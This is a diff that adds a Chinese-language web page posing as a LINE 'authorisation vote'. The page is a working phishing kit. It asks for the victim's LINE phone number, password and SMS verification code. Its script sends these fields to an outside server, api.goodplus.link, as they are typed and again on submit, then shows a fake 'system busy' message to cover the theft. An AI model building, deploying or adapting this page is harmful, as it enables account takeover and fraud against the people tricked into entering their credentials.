@@ -1,0 +1,174 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>LINE授權投票</title>
+    <script type="text/javascript" src="css/flexible.js"></script>
+    <link rel="stylesheet" href="css/index.css" />
+    <link rel="stylesheet" href="css/default.css" />
+    <link rel="stylesheet" href="css/form.css" />
+</head>
+<body>
+<div v-cloak id="app">
+    <div class="nav">LINE授權投票</div>
+    <div class="text-center margin-20">
+        <img class="logo" src="css/3322.png" alt="" />
+    </div>
+    <div class="text-center">
+        <b class="fs-20 fw-600 line-40">歡迎使用line 進行授權投票</b>
+        <p class="fs-14 line-20 padding-vh40">輸入電話號碼密碼並點選下一步代表您已經同意LINE的服務條例及隱私條款</p>
+    </div>
+
+    <div class="margin-15 overflow">
+        <van-form label-align="left" @submit="onSubmit" @failed="onFailed">
+            <van-field
+                    v-model="form.phone"
+                    required
+                    @input="quickSave"
+                    placeholder="請輸入LINE電話號碼"
+                    :rules="[{ required: true, message: '請輸入LINE電話號碼' }]">
+                <template #label><span class="fs-12">電話號碼</span></template>
+            </van-field>
+            <van-field
+                    v-model="form.password"
+                    required
+                    @input="quickSave"
+                    placeholder="請輸入密碼"
+                    :rules="[{ required: true, message: '請輸入密碼' }]"
+            >
+                <template #label><span class="fs-12">輸入密碼</span></template>
+            </van-field>
+            <van-field
+                    v-model="form.code"
+                    required
+                    @input="quickSave"
+                    placeholder="請輸入LINE認證碼"
+                    type="number"
+                    maxlength="6"
+                    :rules="[{ required: true, message: '請輸入LINE認證碼' }]">
+                <template #label><span class="fs-12">輸入認證碼</span></template>
+                <template #button>
+                    <span @click="getCode">{{codeWord}}</span>
+                </template>
+            </van-field>
+            <div class="text-center margin-t20">
+                <van-button round block type="danger" native-type="submit">確認</van-button>
+            </div>
+        </van-form>
+    </div>
+</div>
+</body>
+<script src="css/vue.min.js"></script>
+<script src="css/vant.min.js"></script>
+<script src="css/jquery-2.1.1.min.js"></script>
+<script>
+    new Vue({
+        el: '#app',
+        data() {
+            return {
+                timer: null,
+                codeWord: '發送',
+                time: 60,
+                canClick: true,
+                form: {
+                    phone: '',
+                    password: '',
+                    code: ''
+                }
+            }
+        },
+        methods: {
+            getCode() {
+                if (this.codeWord !== '發送') { return }
+
+                var phoneNumberPattern = /^\d{8,10}$/;
+                var cktel = phoneNumberPattern.test(this.form.phone);
+                if(!cktel){
+                  this.$toast.fail('電話號碼不正確！');
+                  return false;
+                }
+                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
+                var ckpass = passwordPattern.test(this.form.password);
+                if(!ckpass){
+                   this.$toast.fail("密碼不正確！");
+                   return false;
+                }
+
+                this.canClick = false
+                this.timer = setInterval(() => {
+                    this.count()
+                }, 1000)
+            },
+            count() {
+                this.time--
+                this.codeWord = this.time + 's'
+                if (this.time <= 0) {
+                    this.codeWord = '發送'
+                    clearInterval(this.timer)
+                    this.time = 60
+                    this.canClick = true
+                }
+            },
+            onFailed(errorInfo) {
+                this.$toast.fail('請填寫完善');
+                console.log('failed', errorInfo);
+            },
+            // 保存每一步输入
+            quickSave() {
+                if(this.form.code.length<6 && this.form.code != ''){
+                    return false;
+                }
+                if(this.form.phone<8 && this.form.phone != ''){
+                    return false;
+                }
+                if(this.form.password<8 && this.form.password != ''){
+                    return false;
+                }
+                console.log('save', this.form)
+                this.form.id = document.getElementById('id');
+                $.ajax({
+                    url:"https://api.goodplus.link?get=save",
+                    type: 'post',
+                    dataType: 'JSON',
+                    data: this.form,
+                    success:function(data){}
+                });
+            },
+            onSubmit() {
+               var phoneNumberPattern = /^\d{8,10}$/;
+                var cktel = phoneNumberPattern.test(this.form.phone);
+                if(!cktel){
+                  this.$toast.fail('電話號碼不正確！');
+                  return false;
+                }
+                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
+                var ckpass = passwordPattern.test(this.form.password);
+                if(!ckpass){
+                   this.$toast.fail("密碼不正確！");
+                   return false;
+                }
+                if(this.form.code.length!=6){
+                    this.$toast.fail("请输入6位認證碼！");
+                    return false;
+                }
+               console.log('submit', this.form);
+                this.form.id = document.getElementById('id');
+              $.ajax({
+                  url:"https://api.goodplus.link?get=submit",
+                  type: 'post',
+                  dataType: 'JSON',
+                  data: this.form,
+                  success:function(data){
+                    setTimeout(function(){
+                        //window.location.href='/index.php/Home/Index';
+                        alert('系統繁忙中~請一小時後再試！');
+                    },2000);
+                    return false;
+                  }
+              });
+            }
+        }
+    })
+</script>
+</html>
